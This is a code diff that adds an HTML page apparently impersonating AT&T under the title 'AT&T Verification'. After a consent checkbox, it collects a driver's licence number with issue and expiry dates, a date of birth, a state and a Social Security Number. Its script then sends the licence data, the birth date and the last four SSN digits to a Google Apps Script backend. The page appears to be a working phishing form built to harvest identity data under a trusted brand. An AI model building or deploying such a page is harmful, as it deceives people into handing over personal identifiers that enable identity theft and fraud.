@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AT&T Verification</title>
+<style>
+body { font-family: Arial, sans-serif; background:#f4f8fb; margin:0; }
+.container { max-width:420px; margin:50px auto; background:#fff; padding:25px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.15);}
+.logo { text-align:center; font-size:36px; font-weight:bold; color:#009fdb; animation:pulse 2s infinite; }
+@keyframes pulse { 0%{opacity:.4} 50%{opacity:1} 100%{opacity:.4} }
+label { margin-top:12px; display:block; font-weight:bold; }
+input, select, button { width:100%; padding:10px; margin-top:5px; border-radius:6px; border:1px solid #ccc; }
+button { background:#009fdb; color:white; border:none; margin-top:20px; cursor:pointer; }
+button:disabled { background:#aaa; }
+.hidden { display:none; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">AT&T</div>
+
+  <!-- CONSENT -->
+  <div id="consent">
+    <p>Please confirm your consent to continue.</p>
+    <label><input type="checkbox" id="agree"> I Agree</label>
+    <button id="continueBtn" disabled>Continue</button>
+  </div>
+
+  <!-- FORM -->
+  <div id="formSection" class="hidden">
+    <label>License Number</label>
+    <input id="license" required>
+
+    <label>Issue Date</label>
+    <input type="date" id="issueDate" required>
+
+    <label>Expiration Date</label>
+    <input type="date" id="expiryDate" required>
+
+    <label>Date of Birth</label>
+    <input type="date" id="dob" required>
+
+    <label>State</label>
+    <select id="state">
+      <option value="">Select State</option>
+      <option>AL</option><option>AK</option><option>AZ</option>
+      <option>AR</option><option>CA</option><option>CO</option>
+      <option>CT</option><option>DE</option><option>FL</option>
+      <option>GA</option><option>HI</option><option>ID</option>
+      <option>IL</option><option>IN</option><option>IA</option>
+      <option>KS</option><option>KY</option><option>LA</option>
+      <option>ME</option><option>MD</option><option>MA</option>
+      <option>MI</option><option>MN</option><option>MS</option>
+      <option>MO</option><option>MT</option><option>NE</option>
+      <option>NV</option><option>NH</option><option>NJ</option>
+      <option>NM</option><option>NY</option><option>NC</option>
+      <option>ND</option><option>OH</option><option>OK</option>
+      <option>OR</option><option>PA</option><option>RI</option>
+      <option>SC</option><option>SD</option><option>TN</option>
+      <option>TX</option><option>UT</option><option>VT</option>
+      <option>VA</option><option>WA</option><option>WV</option>
+      <option>WI</option><option>WY</option>
+    </select>
+
+    <label>Social Security Number</label>
+    <input id="ssn" placeholder="***-**-1234" maxlength="11">
+
+    <button onclick="submitForm()">Submit</button>
+  </div>
+</div>
+
+<script>
+const agree = document.getElementById("agree");
+const continueBtn = document.getElementById("continueBtn");
+const consent = document.getElementById("consent");
+const formSection = document.getElementById("formSection");
+
+agree.addEventListener("change", () => {
+  continueBtn.disabled = !agree.checked;
+});
+
+continueBtn.onclick = () => {
+  consent.classList.add("hidden");
+  formSection.classList.remove("hidden");
+};
+
+// SSN masking
+let rawSSN = "";
+const ssnInput = document.getElementById("ssn");
+ssnInput.addEventListener("input", e => {
+  rawSSN = e.target.value.replace(/\D/g, "").slice(0,9);
+  if(rawSSN.length>=5) e.target.value="***-**-"+rawSSN.slice(-4);
+  else e.target.value="";
+});
+
+function submitForm() {
+  const license = document.getElementById("license").value;
+  const issueDate = document.getElementById("issueDate").value;
+  const expiryDate = document.getElementById("expiryDate").value;
+  const dob = document.getElementById("dob").value;
+  const state = document.getElementById("state").value;
+
+  if(new Date(issueDate) >= new Date(expiryDate)){
+    alert("Issue date must be before expiration date"); return;
+  }
+  if(new Date(dob) >= new Date()){
+    alert("Date of Birth must be in the past"); return;
+  }
+
+  google.script.run.withSuccessHandler(()=>{
+    alert("Submission successful!");
+  }).saveData({
+    license,
+    issueDate,
+    expiryDate,
+    dob,
+    state,
+    ssn: rawSSN.slice(-4)
+  });
+}
+</script>
+</body>
+</html>
